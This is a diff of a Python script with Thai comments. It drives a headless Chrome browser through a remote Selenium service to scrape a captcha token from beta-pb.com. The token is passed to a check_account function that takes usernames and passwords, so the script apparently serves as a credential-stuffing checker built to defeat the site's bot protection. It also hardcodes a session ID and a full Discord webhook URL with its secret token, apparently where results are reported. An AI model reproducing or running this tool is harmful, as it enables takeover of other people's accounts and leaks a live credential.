@@ -6,54 +6,68 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
 
-# ================== ตั้งค่า ==================
+# ================== 🔥 ตั้งค่า ==================
 SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # เปลี่ยน
+WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # 👈 เปลี่ยนเป็นของคุณ
+
+# URL ของ Selenium Standalone Chrome Service (เปลี่ยนเป็น URL ของคุณ)
+SELENIUM_URL = "http://selenium-standalone-chrome.railway.internal:4444/wd/hub"
 
 def get_captcha_token():
+    """ใช้ Remote WebDriver เชื่อมต่อ Selenium Service"""
     options = Options()
     options.add_argument("--headless")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-gpu")
     options.add_argument("--window-size=1920,1080")
     
+    driver = None
     try:
-        # ใช้ webdriver_manager ดาวน์โหลด chromedriver อัตโนมัติ
-        service = Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service, options=options)
-    except Exception as e:
-        print(f"   ⚠️ webdriver_manager error: {e}")
-        # ถ้า webdriver_manager ล้มเหลว ให้ลอง undetected_chromedriver
-        try:
-            import undetected_chromedriver as uc
-            driver = uc.Chrome(options=options, version_main=None)
-        except:
-            return None
-
-    try:
+        # เชื่อมต่อกับ Selenium Service
+        driver = webdriver.Remote(
+            command_executor=SELENIUM_URL,
+            options=options
+        )
         driver.get("https://beta-pb.com")
-        wait = WebDriverWait(driver, 10)
+        wait = WebDriverWait(driver, 15)
+        
         token = None
+        
+        # หา captcha_token จาก input
         try:
             elem = wait.until(EC.presence_of_element_located((By.NAME, "captcha_token")))
             token = elem.get_attribute("value")
+            if token:
+                return token
         except:
             pass
-        if not token:
-            try:
-                token = driver.execute_script("return window.captcha_token || ''")
-            except:
-                pass
-        return token
+        
+        # หาใน JavaScript
+        try:
+            token = driver.execute_script("return window.captcha_token || ''")
+            if token:
+                return token
+        except:
+            pass
+        
+        # หาใน meta/data attribute
+        try:
+            elem = driver.find_element(By.CSS_SELECTOR, "[data-captcha-token]")
+            token = elem.get_attribute("data-captcha-token")
+            if token:
+                return token
+        except:
+            pass
+        
+        return None
+        
     except Exception as e:
-        print(f"   ⚠️ error in get_captcha_token: {e}")
+        print(f"   ⚠️ get_captcha_token error: {e}")
         return None
     finally:
-        driver.quit()
+        if driver:
+            driver.quit()
 
 def check_account(username, password, session, captcha_token):
     headers = {
